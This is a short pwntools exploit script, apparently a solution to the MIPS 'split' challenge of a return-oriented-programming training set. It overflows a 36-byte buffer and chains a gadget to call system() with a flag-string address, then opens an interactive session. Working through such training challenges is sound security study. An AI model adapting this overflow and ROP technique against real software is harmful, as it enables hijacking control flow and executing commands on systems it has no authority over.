from pwn import *

r=process('./split_mipsel')

r.recvuntil('> ')
gadget=0x00400a20
flag=0x00411010
system=0x00400b70
payload='a'*36
payload+=p32(0x00400a20)
payload+=p32(0)
payload+=p32(system)
payload+=p32(flag)

r.sendline(payload)

r.interactive()
